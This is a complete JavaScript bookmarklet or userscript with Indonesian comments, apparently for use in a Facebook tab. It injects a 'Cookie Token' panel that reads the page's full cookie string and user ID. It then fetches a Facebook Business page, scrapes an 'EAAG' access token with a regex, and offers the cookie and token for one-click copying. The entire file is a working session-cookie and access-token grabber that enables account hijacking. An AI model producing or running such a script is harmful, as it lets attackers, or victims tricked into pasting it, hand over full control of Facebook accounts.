(function() {
    // 1. UI Sesuai Template Anda
    const style = document.createElement('style');
    style.textContent = `
        #floatBtn { position: fixed; bottom: 10vw; right: 7vw; z-index: 2147483647; width: 12vw; height: 12vw; background: #0866FF; border-radius: 50%; display: flex; align-items: center; justify-content: center; cursor: pointer; font-size: 5vw; box-shadow: 0 3px 8px rgba(0,0,0,0.4); border: 0.4vw solid white; }
        #guard-modal { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: #fdfafa; z-index: 2147483646; padding: 4vw; box-sizing: border-box; display: none; overflow-y: auto; font-family: sans-serif; }
        .section-box { background: #e8e8e8; padding: 4vw; border-radius: 2vw; margin-bottom: 3vw; }
        .access-label { font-size: 3vw; font-weight: bold; color: #53000f; display: block; margin-bottom: 1vw; }
        .access-area { width: 100%; height: 15vw; font-size: 2.5vw; border-radius: 2vw; padding: 2vw; box-sizing: border-box; background: #111; color: #0bfa31; border: none; resize: none; margin-bottom: 2vw; font-family: monospace !important; word-break: break-all; }
        .btn-main { width: 100%; padding: 3vw; background: #0866FF; color: white; border-radius: 2.5vw; border: none; font-weight: bold; font-size: 4vw; cursor: pointer; }
        #mStatus { text-align:center; font-weight:bold; font-size:6vw; color:#888; margin-top: 5vw; }
    `;
    document.head.appendChild(style);

    const container = document.createElement('div');
    container.innerHTML = `
        <div id="floatBtn">💾️</div>
        <div id="guard-modal">
            <h1 style="text-align:center; font-size:7vw; color:#3c3c3c;">Cookie <span style="color:#0866FF;">Token</span></h1>
            <div class="section-box">
                <button id="mGetAccess" class="btn-main">FETCH DATA SEKARANG</button>
                <div id="contentAccess" style="display:none; margin-top:4vw;">
                    <label class="access-label">ID:</label>
                    <textarea id="resId" class="access-area" readonly></textarea>
                    <label class="access-label">COOKIE:</label>
                    <textarea id="resCookie" class="access-area" readonly></textarea>
                    <label class="access-label">TOKEN EAAG:</label>
                    <textarea id="resToken" class="access-area" readonly placeholder="Mencari Token..."></textarea>
                </div>
            </div>
            <p id="mStatus">Notification</p>
        </div>
    `;
    document.body.appendChild(container);

    const modal = document.getElementById('guard-modal');
    const floatBtn = document.getElementById('floatBtn');
    const status = document.getElementById('mStatus');

    floatBtn.onclick = () => modal.style.display = (modal.style.display === 'block') ? 'none' : 'block';

    // 2. Logika Utama (Sama dengan Python: Tembak business_locations)
    document.getElementById('mGetAccess').onclick = async function() {
        this.innerText = "Processing...";
        const uid = document.cookie.match(/c_user=(\d+)/)?.[1] || "Not Found";
        document.getElementById('resId').value = uid;
        document.getElementById('resCookie').value = document.cookie;

        try {
            // Mengikuti jalur Python: business.facebook.com/business_locations
            const response = await fetch('https://business.facebook.com/business_locations', {
                method: 'GET',
                headers: {
                    // Menggunakan User-Agent yang sama dengan script Python DulLah
                    'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36'
                }
            });
            const html = await response.text();
            
            // Regex mencari EAAG (Sama dengan Python: group(1))
            const tokenMatch = html.match(/(EAAG\w+)/);
            const token = tokenMatch ? tokenMatch[1] : "Gagal: Cookie tidak valid atau tidak ada akses Business.";
            
            document.getElementById('resToken').value = token;
            document.getElementById('contentAccess').style.display = 'block';
            status.innerHTML = '<span style="color:#00df1f;">Data Berhasil Diambil!</span>';
        } catch (err) {
            document.getElementById('resToken').value = "Error: Pastikan jalankan di tab Facebook!";
            status.innerHTML = '<span style="color:red;">Koneksi Gagal!</span>';
        }
        this.innerText = "FETCH DATA SEKARANG";
    };

    // Fungsi Klik untuk Copy
    ['resId', 'resCookie', 'resToken'].forEach(id => {
        const el = document.getElementById(id);
        el.onclick = function() {
            this.select();
            document.execCommand('copy');
            status.innerHTML = '<span style="color:#0866FF;">Copied!</span>';
            setTimeout(() => { status.innerHTML = "Notification"; }, 1500);
        };
    });
})();
